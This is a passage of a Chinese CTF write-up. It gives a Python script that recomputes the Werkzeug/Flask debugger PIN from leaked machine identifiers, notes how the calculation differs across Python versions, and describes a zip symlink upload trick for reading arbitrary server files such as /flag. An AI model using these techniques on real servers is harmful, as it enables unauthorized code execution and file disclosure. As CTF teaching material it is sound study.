    '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '95533043256',# str(uuid.getnode()),  /sys/class/net/eth0/address
    '96cec10d3d9307792745ec3b85c89620567bdd6dd7eb762b937eccd1f8e6a61036dd86ddad5c1669887bbd197d5e1852'# get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
            continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv=None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)
```

还有一点需要注意的是，对于md5与sha1的分界点是**py3**

而**machin_id**的分界点是**py3.8**

#### 测试环境

以上测试只在

**py2.7 py3.7 py3.8 py3.10(只有这个为windows)**

下进行，如果其他版本也有区别，欢迎补充

#### 软链接

顺便在这里提下mtctf中算pin的很关键的软链接查看文件

软链接其是就和名字的意思一样，指向一个文件的链接

```sh
xlccccc@xl-pc:/ctf/web/mtb$ ls
1.py  123.py  __pycache__  app.py  index.html  test.py  uploads
xlccccc@xl-pc:/ctf/web/mtb$ ln -s /flag flag
xlccccc@xl-pc:/ctf/web/mtb$ ls
1.py  123.py  __pycache__  app.py  flag  index.html  test.py  uploads
xlccccc@xl-pc:/ctf/web/mtb$ cat flag
flag{I_4m_x1cCcCC}
```

而本题是可以上传压缩包，然后在**他的环境下解压**

我们就可以上传一个软链接的压缩包在他的环境下解压后访问任意文件了

```sh
zip --symlinks flag.zip flag
```

注意一定要是`symlinks`方法下，否则压缩的就是你软链接指向的那个文件

